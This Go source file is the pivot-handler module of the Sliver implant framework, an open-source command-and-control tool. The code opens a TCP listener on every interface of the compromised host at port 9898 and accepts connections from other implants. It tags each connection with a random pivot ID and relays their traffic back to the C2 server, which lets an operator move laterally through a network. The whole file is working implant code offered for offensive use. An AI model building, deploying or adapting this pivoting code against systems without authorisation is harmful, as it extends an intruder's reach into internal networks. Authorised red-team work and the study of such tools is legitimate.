package handlers

import (
	"fmt"
	"math/rand"
	"net"
	"os"
	"strings"
	"sync"
	"time"

	// {{if .Debug}}
	"log"
	// {{end}}

	pb "github.com/bishopfox/sliver/protobuf/sliver"
	"github.com/bishopfox/sliver/sliver/pivots"
	"github.com/bishopfox/sliver/sliver/transports"
	"github.com/golang/protobuf/proto"
)

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

var (
	genericPivotHandlers = map[uint32]PivotHandler{
		pb.MsgPivotData: pivotDataHandler,
		pb.MsgTCPReq:    tcpListenerHandler,
	}
)

// GetPivotHandlers - Returns a map of pivot handlers
func GetPivotHandlers() map[uint32]PivotHandler {
	return genericPivotHandlers
}

func tcpListenerHandler(envelope *pb.Envelope, connection *transports.Connection) {
	// {{if .Debug}}
	log.Printf("tcpListenerHandler")
	// {{end}}
	StartTCPListener("0.0.0.0", uint16(9898), connection)
	// TODO: handle error
	tcpResp := &pb.TCP{
		Success: true,
	}
	data, _ := proto.Marshal(tcpResp)
	connection.Send <- &pb.Envelope{
		ID:   envelope.GetID(),
		Data: data,
	}
}

// ============================================================================================================================================
// ============================================================================================================================================
// ============================================================================================================================================

// StartTCPListener - Start a TCP listener
func StartTCPListener(bindIface string, port uint16, connection *transports.Connection) (net.Listener, error) {
	// {{if .Debug}}
	log.Printf("Starting Raw TCP listener on %s:%d", bindIface, port)
	// {{end}}
	ln, err := net.Listen("tcp", fmt.Sprintf("%s:%d", bindIface, port))
	if err != nil {
		// {{if .Debug}}
		log.Println(err)
		// {{end}}
		return nil, err
	}
	go tcpPivotAcceptNewConnection(&ln, connection)
	return ln, nil
}

func tcpPivotAcceptNewConnection(ln *net.Listener, connection *transports.Connection) {
	hostname, err := os.Hostname()
	if err != nil {
		// {{if .Debug}}
		log.Printf("Failed to determine hostname %s", err)
		// {{end}}
		hostname = "."
	}
	namedPipe := strings.ReplaceAll((*ln).Addr().String(), ".", hostname)
	for {
		conn, err := (*ln).Accept()
		if err != nil {
			continue
		}
		rand.Seed(time.Now().UnixNano())
		pivotID := rand.Uint32()
		pivotsMap.AddPivot(pivotID, &conn)
		SendPivotOpen(pivotID, "tcp", namedPipe, connection)

		// {{if .Debug}}
		log.Println("Accepted a new connection")
		// {{end}}

		// handle connection like any other net.Conn
		go tcpPivotConnectionHandler(&conn, connection, pivotID)
	}
}

func tcpPivotConnectionHandler(conn *net.Conn, connection *transports.Connection, pivotID uint32) {

	defer func() {
		// {{if .Debug}}
		log.Println("Cleaning up for pivot %d", pivotID)
		// {{end}}
		(*conn).Close()
		pivotClose := &pb.PivotClose{
			PivotID: pivotID,
		}
		data, err := proto.Marshal(pivotClose)
		if err != nil {
			// {{if .Debug}}
			log.Println(err)
			// {{end}}
		}
		connection.Send <- &pb.Envelope{
			Type: pb.MsgPivotClose,
			Data: data,
		}
	}()

	for {
		envelope, err := pivots.PivotReadEnvelope(conn)
		if err != nil {
			// {{if .Debug}}
			log.Println(err)
			// {{end}}
			return
		}
		dataBuf, err1 := proto.Marshal(envelope)
		if err1 != nil {
			// {{if .Debug}}
			log.Println(err1)
			// {{end}}
			return
		}
		pivotOpen := &pb.PivotData{
			PivotID: pivotID,
			Data:    dataBuf,
		}
		data2, err2 := proto.Marshal(pivotOpen)
		if err2 != nil {
			// {{if .Debug}}
			log.Println(err2)
			// {{end}}
			return
		}
		connection.Send <- &pb.Envelope{
			Type: pb.MsgPivotData,
			Data: data2,
		}
	}
}

// ============================================================================================================================================
// ============================================================================================================================================
// ============================================================================================================================================

// SendPivotOpen - Sends a PivotOpen message back to the server
func SendPivotOpen(pivotID uint32, pivotType string, remoteAddr string, connection *transports.Connection) {
	pivotOpen := &pb.PivotOpen{
		PivotID:       pivotID,
		PivotType:     pivotType,
		RemoteAddress: remoteAddr,
	}
	data, err := proto.Marshal(pivotOpen)
	if err != nil {
		// {{if .Debug}}
		log.Println(err)
		// {{end}}
		return
	}
	connection.Send <- &pb.Envelope{
		Type: pb.MsgPivotOpen,
		Data: data,
	}
}

// SendPivotClose - Sends a PivotClose message back to the server
func SendPivotClose(pivotID uint32, err error, connection *transports.Connection) {
	pivotClose := &pb.PivotClose{
		PivotID: pivotID,
		Err:     err.Error(),
	}
	data, err := proto.Marshal(pivotClose)
	if err != nil {
		// {{if .Debug}}
		log.Println(err)
		// {{end}}
		return
	}
	connection.Send <- &pb.Envelope{
		Type: pb.MsgPivotClose,
		Data: data,
	}
}

func pivotDataHandler(envelope *pb.Envelope, connection *transports.Connection) {
	pivData := &pb.PivotData{}
	proto.Unmarshal(envelope.Data, pivData)

	origData := &pb.Envelope{}
	proto.Unmarshal(pivData.Data, origData)

	pivotConn := pivotsMap.Pivot(pivData.GetPivotID())
	if pivotConn != nil {
		pivots.PivotWriteEnvelope(pivotConn, origData)
	} else {
		// {{if .Debug}}
		log.Printf("[pivotDataHandler] PivotID %d not found\n", pivData.GetPivotID())
		// {{end}}
	}
}

// pivotsMap - holds the pivots, provides atomic access
var pivotsMap = &PivotsMap{
	Pivots: &map[uint32]*net.Conn{},
	mutex:  &sync.RWMutex{},
}

// PivotsMap - struct that defines de pivots, provides atomic access
type PivotsMap struct {
	mutex  *sync.RWMutex
	Pivots *map[uint32]*net.Conn
}

// Pivot - Get Pivot by ID
func (p *PivotsMap) Pivot(pivotID uint32) *net.Conn {
	p.mutex.Lock()
	defer p.mutex.Unlock()

	return (*p.Pivots)[pivotID]
}

// AddPivot - Add a pivot to the map (atomically)
func (p *PivotsMap) AddPivot(pivotID uint32, conn *net.Conn) {
	p.mutex.Lock()
	defer p.mutex.Unlock()
	(*p.Pivots)[pivotID] = conn
}

// RemovePivot - Add a pivot to the map (atomically)
func (p *PivotsMap) RemovePivot(pivotID uint32) {
	p.mutex.Lock()
	defer p.mutex.Unlock()
	delete((*p.Pivots), pivotID)
}
